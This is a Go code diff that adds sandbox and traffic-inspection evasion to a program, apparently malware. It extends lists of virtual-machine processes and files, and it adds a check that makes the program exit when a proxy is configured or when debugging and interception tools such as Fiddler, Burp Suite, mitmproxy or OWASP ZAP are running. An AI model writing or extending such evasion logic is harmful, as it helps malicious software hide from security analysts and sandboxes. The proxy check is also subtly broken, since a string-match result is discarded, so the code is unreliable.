@@ -146,8 +146,14 @@ func checkAntiVps() {
 		"vmtoolsd.exe",
 		"VMwareTray.exe",
 		"VMwareUser.exe",
+		"vmware.exe",
+		"vmware-vmx.exe",
 		"prl_tools.exe",
 		"prl_cc.exe",
+		"qemu-ga.exe",
+		"vmsrvc.exe",
+		"vboxservice.exe",
+		"vboxtray.exe",
 	}
 	for _, p := range vmProcesses {
 		if checkProcessRunning(p) {
@@ -164,6 +170,9 @@ func checkAntiVps() {
 		"C:\\Windows\\System32\\vmware-vmx.exe",
 		"C:\\Windows\\System32\\vmware-vmx-stats.exe",
 		"C:\\Windows\\System32\\vmware-vmx-debug.exe",
+		"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
+		"C:\\Program Files\\Oracle\\VirtualBox\\VBoxService.exe",
+		"C:\\Program Files\\Oracle\\VirtualBox\\VBoxTray.exe",
 	}
 	for _, pattern := range vmFiles {
 		if checkFileExists(pattern) {
@@ -195,6 +204,58 @@ func checkAntiVps() {
 	if runtime.NumCPU() < 2 {
 		os.Exit(1)
 	}
+}
+
+func checkAntiMitm() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	if hasProxyConfigured() {
+		os.Exit(1)
+	}
+
+	mitmProcs := []string{
+		"Fiddler.exe",
+		"FiddlerEverywhere.exe",
+		"Charles.exe",
+		"BurpSuite.exe",
+		"burp.exe",
+		"mitmproxy.exe",
+		"Proxifier.exe",
+		"HTTPDebuggerUI.exe",
+		"HTTPDebuggerSvc.exe",
+		"sslsplit.exe",
+		"sslproxy.exe",
+		"zap.exe",
+		"OWASPZAP.exe",
+	}
+	for _, p := range mitmProcs {
+		if checkProcessRunning(p) {
+			os.Exit(1)
+		}
+	}
+}
+
+func hasProxyConfigured() bool {
+	for _, key := range []string{"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"} {
+		if v := strings.TrimSpace(os.Getenv(key)); v != "" {
+			if _, err := url.Parse(v); err == nil {
+				return true
+			}
+		}
+	}
+
+	cmd := exec.Command("netsh", "winhttp", "show", "proxy")
+	out, err := cmd.Output()
+	if err == nil {
+		text := strings.ToLower(string(out))
+		if strings.Contains(text, "proxy server"); text != "" && !strings.Contains(text, "direct access") {
+			return true
+		}
+	}
+
+	return false
 }
 
 func checkFileExists(pattern string) bool {
